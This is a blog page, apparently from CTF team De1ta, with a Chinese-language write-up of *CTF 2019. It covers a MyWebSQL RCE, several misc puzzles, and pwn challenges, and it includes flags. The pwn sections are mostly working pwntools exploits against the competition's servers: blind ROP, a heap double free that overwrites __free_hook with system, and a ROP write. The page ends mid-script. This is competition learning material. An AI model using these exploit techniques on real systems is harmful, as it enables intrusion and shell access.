<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="De1ta-Team">
    

    <!--Author-->
    
        <meta name="author" content="chybeta、pr0ph3t">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="\*CTF 2019 Writeup"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="De1ta"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>\*CTF 2019 Writeup - De1ta</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><img src="https://avatars0.githubusercontent.com/u/39492862"></a>
        
        <!-- hacked by chybeta -->
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2019/04/30/*CTF 2019 Writeup/">
                \*CTF 2019 Writeup
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-04-30</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h1 id="De1ta-Team"><a href="#De1ta-Team" class="headerlink" title=" De1ta-Team"></a> <strong>De1ta-Team</strong></h1><a id="more"></a>
<blockquote>
<p>Team：De1ta</p>
</blockquote>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="mywebsql"><a href="#mywebsql" class="headerlink" title="mywebsql"></a>mywebsql</h3><p>admin admin登录<br>利用 MyWebSQL ver 3.7 RCE getshell<br><a href="https://github.com/eddietcc/CVEnotes/blob/master/MyWebSQL/RCE/readme.md" target="_blank" rel="noopener">https://github.com/eddietcc/CVEnotes/blob/master/MyWebSQL/RCE/readme.md</a></p>
<p>/目录下有个readflag，需要做先做一个计算才能getflag<br>服务端没python，但有perl</p>
<p>perl脚本:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env perl </span><br><span class="line">use warnings;</span><br><span class="line">use strict;</span><br><span class="line">use IPC::Open2;</span><br><span class="line"></span><br><span class="line">$| = 1;</span><br><span class="line">chdir &quot;/&quot;; #!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line"></span><br><span class="line">my $pid = open2(\*out2, \*in2, &apos;/readflag&apos;) or die;</span><br><span class="line"></span><br><span class="line">my $reply = &lt;out2&gt;;</span><br><span class="line">print STDOUT $reply; #string: solve captcha..</span><br><span class="line">$reply = &lt;out2&gt;;</span><br><span class="line">print STDOUT $reply; #captcha formula</span><br><span class="line"></span><br><span class="line">my $answer = eval($reply);</span><br><span class="line">print STDOUT &quot;answer: $answer\n&quot;; </span><br><span class="line"></span><br><span class="line">print in2 &quot; $answer &quot;; #send it to process</span><br><span class="line">in2-&gt;flush();</span><br><span class="line"></span><br><span class="line">$reply = &lt;out2&gt;;</span><br><span class="line">print STDOUT $reply; #flag :D</span><br><span class="line">$reply = &lt;out2&gt;;</span><br><span class="line">print STDOUT $reply; #flag :D</span><br></pre></td></tr></table></figure>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="she"><a href="#she" class="headerlink" title="she"></a>she</h3><p>根据提示，杀死左小角小屋内的鸡拿flag。</p>
<p>先跟右下角的女生对话后会不能存档。</p>
<p>存个档，进右上角小屋杀只怪，升一级的点前后再存档，比较两个存档的不同。</p>
<p>再存档内可以看到gold，exp，level等后面的数值不一样。稍微修改一下，发现存数据的规律：</p>
<p>0x69表示类型位整型，下一个字符表示用到多少字节存数据，只用1字节的时候不要，最多四字节，因此所有数据都是5开始的。我们把金钱，经验值调大，进游戏一刀满级，然后去左上角的商店买装备。</p>
<p>然而还是打不过，想了想鸡的攻防可能超过我们已有的最高攻防了。</p>
<p>这是可以改游戏文件，把鸡的攻防调为最低。</p>
<p>在data文件夹内有个叫enemies的文件，在里面可以看到大概是两个敌人，一个叫Julia，就是那只鸡，一个叫Trainer训练假人。</p>
<p>稍微摸索一下数据，看到几个比较关键的比如def，atk等，或者直接干脆把所有的都改成05 或者06。</p>
<p>再去打鸡，可以一刀秒了。</p>
<p>接下来还不能直接拿flag，根据提示，打开所有的门中的宝箱。有些门不能直接开，开完后面的门才能开。基本这里就是比走位躲幽灵的时间了。</p>
<p>所有门开完后最后的多了个门，里面提示把之前宝箱内的数字连起来md5即是flag。</p>
<p>数字要按顺序从左到右</p>
<p>213697</p>
<p>*ctf{d6f3fdffbcb462607878af65d059f274}</p>
<h3 id="babyflash"><a href="#babyflash" class="headerlink" title="babyflash"></a>babyflash</h3><p>打开看到黑白黑白的，用工具打开，有图片、有声音</p>
<p>flash总共441帧，21*21？联想到二维码<br>导出所有图片，用脚本拼成二维码，如下图，扫出来只有一半flag</p>
<p>刚刚还有声音，导出来看看有什么<br>用audacity看频谱图，就有了剩下另一半</p>
<blockquote>
<p>*ctf{half_flag_&amp;&amp;_the_rest}</p>
</blockquote>
<h3 id="otaku"><a href="#otaku" class="headerlink" title="otaku"></a>otaku</h3><p>附件里的文档，提到的内容与<a href="https://www.imdb.com/title/tt7225072/有关" target="_blank" rel="noopener">https://www.imdb.com/title/tt7225072/有关</a><br>应该与解密压缩包的key有关，一部日本的一部动漫<br>英文名：Violet Evergarden<br>日文名：ヴァイオレット·エヴァーガーデン</p>
<p>otaku是宅男的意思。</p>
<p>原文<br><a href="https://www.imdb.com/title/tt7225072/plotsummary?ref_=tt_ov_pl" target="_blank" rel="noopener">https://www.imdb.com/title/tt7225072/plotsummary?ref_=tt_ov_pl</a></p>
<p>比对word</p>
<p>这里少了I love you<br>但是输入密码不对。。。。</p>
<p>word还有个Memory 但是原文是Memoir ，但是应该无关<br>重点在文档中这句话</p>
<p>复制出来竟然是这个：</p>
<p>Violet then remembers that “I love you Hello everyone, I am Gilbert. Everyone thought that I was killed, but actually I survived. Now that I have no cash with me and I’m trapped in another country. I can’t contact Violet now. She must be desperate to see me and I don’t want her to cry for me. I need to pay 300 for the train, and 88 for the meal. Cash or battlenet point are both accepted. I don’t play the Hearthstone, and I don’t even know what is Rastakhan’s Rumble.” were the last words Gilbert I-the-almighty-quiz-maker had told her.</p>
<p>输入别的密码会提示密码错误，输入Hearthstone会提示文件损坏。。。<br>原始压缩包用rar修复一下，可以提取flag.zip，里面有flag.png和last words.txt</p>
<p>把这段话GBK编码后加密的word,txt字节相同，是已知明文攻击<br>Hello everyone, I am Gilbert. Everyone thought that I was killed, but actually I survived. Now that I have no cash with me and I’m trapped in another country. I can’t contact Violet now. She must be desperate to see me and I don’t want her to cry for me. I need to pay 300 for the train, and 88 for the meal. Cash or battlenet point are both accepted. I don’t play the Hearthstone, and I don’t even know what is Rastakhan’s Rumble.</p>
<p>明文攻击成功，那道flag.png<br>lsb隐写用zsteg一把梭</p>
<blockquote>
<p>*ctf{vI0l3t_Ev3rg@RdeN}</p>
</blockquote>
<p>##Pwn</p>
<h3 id="blind-pwn"><a href="#blind-pwn" class="headerlink" title="blind pwn"></a>blind pwn</h3><p>Step1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#/usr/bin</span><br><span class="line">#coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">i = 1</span><br><span class="line">len = 0</span><br><span class="line">while 1:</span><br><span class="line">   try:</span><br><span class="line">       sh = remote(&apos;34.92.37.22&apos;, 10000)</span><br><span class="line">       sh.recvuntil(&apos;Welcome to this blind pwn!\n&apos;)</span><br><span class="line">       sh.send(i * &apos;a&apos;)</span><br><span class="line">       output = sh.recv()</span><br><span class="line">       sh.close()</span><br><span class="line">       if not output.startswith(&apos;Goodbye!&apos;):</span><br><span class="line">           len = i - 1</span><br><span class="line">           break</span><br><span class="line">       else:</span><br><span class="line">           i += 1</span><br><span class="line">   except EOFError:</span><br><span class="line">       sh.close()</span><br><span class="line">       print &quot;EOF error!&quot;</span><br><span class="line">       len = i - 1</span><br><span class="line">       break</span><br><span class="line"></span><br><span class="line">print len</span><br></pre></td></tr></table></figure>
<p>stack length: 40</p>
<p>-———</p>
<p>可以试下 ‘a’*0x28+’\n’ 会在goodbye后还输出一堆东西，不过看了下，好像没什么地址之类的<br>Step2:</p>
<p>找到一个stop gadget:<br>0x400776，貌似是main函数，反正又会输出一遍</p>
<p>找到一个stop gadget:<br>0x400515 输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x15\x05@\x00\x00\x00\x00\x00</span><br><span class="line">\x12\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x07@\x00\x00\x00\x00\x000\x8b\x0c\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x0\x12\x7f\x00\x00\xa0\xbc+\x8c\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa3Y\x9cF\x1cFn\x7fp\x05@\x00\x00\x00\x00\x00\x00\x12\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa3Y\xbcjZa\x91\x80\xa3Y\x0cQw\x81\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x12\x7f\x00\x00h+\x8c\x0c\x7f\x00\x00g</span><br><span class="line">\x8c\x0c\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x05@\x00\x00\x00\x00\x00\x00\x12\x7f\x00\x00</span><br></pre></td></tr></table></figure>
<p>get stop gadget:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       sh = remote(<span class="string">'34.92.37.22'</span>, <span class="number">10000</span>)</span><br><span class="line">       sh.recvuntil(<span class="string">'Welcome to this blind pwn!\n'</span>)</span><br><span class="line">       payload = <span class="string">'a'</span> * <span class="number">40</span> + p64(addr)</span><br><span class="line">       sh.sendline(payload)</span><br><span class="line">       content = sh.recv()</span><br><span class="line">       <span class="keyword">print</span> content</span><br><span class="line">       sh.close()</span><br><span class="line">       <span class="keyword">print</span> <span class="string">'one success stop gadget addr: 0x%x'</span> % (addr)</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   <span class="keyword">except</span> Exception:</span><br><span class="line">       addr += <span class="number">1</span></span><br><span class="line">       sh.close()</span><br></pre></td></tr></table></figure>
<p>测试了下，好像只能溢出8个字节，跳到0x400515 就跳不回main函数了</p>
<p>感觉是它有调用sleep</p>
<p>main函数地址错了，真正的是0x400570</p>
<p>payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">''</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'34.92.37.22'</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Welcome to this blind pwn!\n'</span>)</span><br><span class="line"><span class="comment">#0x400755</span></span><br><span class="line"><span class="comment">#0x40072f</span></span><br><span class="line">se(<span class="string">'a'</span>*<span class="number">0x28</span>+p64(<span class="number">0x400515</span>)+p64(<span class="number">0x400570</span>)*<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">data = p.recv(<span class="number">0x100</span>)</span><br><span class="line">libc = u64(data[<span class="number">0x20</span>:<span class="number">0x28</span>])</span><br><span class="line">base = libc - <span class="number">0x020830</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Welcome to this blind pwn!\n'</span>)</span><br><span class="line">se(<span class="string">'a'</span>*<span class="number">0x28</span>+p64(base+<span class="number">0x4526a</span>)+<span class="string">'\x00'</span>*<span class="number">0x40</span>)</span><br><span class="line">print(hex(base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>*CTF{Qri2H5GjeaO1E9Jg6dmwcUvSLX8RxpI7}</p>
</blockquote>
<h3 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h3><p>调了一个小时，最后发现是网络问题．．．网络差评</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p=process(["./lib/ld-2.29.so","./chall"],env=&#123;"LD_PRELOAD":"./lib/libc.so.6"&#125;)</span></span><br><span class="line">libc=ELF(<span class="string">"./lib/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./chall")</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p=remote(<span class="string">"34.92.96.238"</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,call)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Input your choice:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Please input the size of girl's name"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"please inpute her name:"</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">"please input her call:"</span>)</span><br><span class="line">	p.send(call)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Input your choice:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Please input the index:"</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Input your choice:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Please input the index:"</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">"po\n"</span>,<span class="string">"999\n"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">"po\n"</span>,<span class="string">"999\n"</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">"po\n"</span>,<span class="string">"999\n"</span>) <span class="comment">#2</span></span><br><span class="line">call(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name:\n"</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>)+<span class="string">"\x00\x00"</span>)<span class="number">-0x3b1ca0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">call(<span class="number">1</span>)</span><br><span class="line">call(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"name:\n"</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>)+<span class="string">"\x00\x00"</span>)<span class="number">-0x7b0</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">"p\n"</span>,<span class="string">"9\n"</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"p\n"</span>,<span class="string">"9\n"</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"p\n"</span>,<span class="string">"9\n"</span>) <span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"p\n"</span>,<span class="string">"9\n"</span>) <span class="comment">#12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	call(<span class="number">3</span>+i)</span><br><span class="line"></span><br><span class="line">call(<span class="number">10</span>)</span><br><span class="line">call(<span class="number">11</span>)</span><br><span class="line">call(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">"p\n"</span>,<span class="string">"9\n"</span>) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook),<span class="string">"999\n"</span>)</span><br><span class="line">one_gadget=libc_base+<span class="number">0xdf991</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0xdf991	execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"p\n"</span>,<span class="string">"9\n"</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00\n"</span>,<span class="string">"9\n"</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system)+<span class="string">"\n"</span>,<span class="string">"9\n"</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>,<span class="string">"9\n"</span>) <span class="comment">#0x18</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>,<span class="string">"9\n"</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>,<span class="string">"9\n"</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>,<span class="string">"9\n"</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>,<span class="string">"9\n"</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>,<span class="string">"9\n"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"???"</span></span><br><span class="line">call(<span class="number">0x1a</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>*CTF{pqyPl2seQzkX3r0YntKfOMF4i8agb56D}</p>
</blockquote>
<h3 id="quicksort"><a href="#quicksort" class="headerlink" title="quicksort"></a>quicksort</h3><p>覆盖ptr达到任意地址写，写的时候注意栈分布，修改atoi进行rop即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">fpath        = <span class="string">"./quicksort"</span></span><br><span class="line">offset       = <span class="number">28</span></span><br><span class="line">debug        = <span class="number">1</span></span><br><span class="line">times = <span class="number">2</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">e = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="keyword">if</span> debug <span class="keyword">is</span> <span class="number">0</span>:</span><br><span class="line">     r = process(fpath)</span><br><span class="line">     gdb.attach(p)<span class="comment">#"b *0x8048916")</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     r = remote(<span class="string">"34.92.96.238"</span>,<span class="number">10000</span>)</span><br><span class="line">r.recvuntil(<span class="string">"how many numbers do you want to sort?\n"</span>)</span><br><span class="line">r.sendline(str(times))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"th number:"</span>)p</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"134515285"</span> + <span class="string">"a"</span> * <span class="number">7</span> + p32(<span class="number">0x8048a53</span> + <span class="number">3</span>) + p32(<span class="number">0x8048a53</span>) + p32(<span class="number">0x8048a53</span> + <span class="number">3</span>) + p32(<span class="number">0x804A020</span> - <span class="number">0x8048a53</span> * <span class="number">4</span> + <span class="number">0x100000000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_plt = <span class="number">0x8048560</span></span><br><span class="line">puts_got = <span class="number">0x804A02C</span></span><br><span class="line">gets_plt = <span class="number">0x08048500</span></span><br><span class="line">r.recvuntil(<span class="string">"th number:"</span>)</span><br><span class="line"><span class="comment">#leak -&gt; gets -&gt;shell</span></span><br><span class="line">payload = <span class="string">"13451529"</span> + p32(<span class="number">0x8048530</span>) + p32(<span class="number">0x01010101</span>) + p32(<span class="number">0x8048a53</span> + <span class="number">3</span>) + p32(<span class="number">0x8048a53</span>) + p32(<span class="number">0x8048a53</span> + <span class="number">3</span>) + p32(<span class="number">0x804A038</span> - <span class="number">0x8048a53</span> * <span class="number">4</span> + <span class="number">0x100000000</span>) + p32(<span class="number">0x01010101</span>) + p32(<span 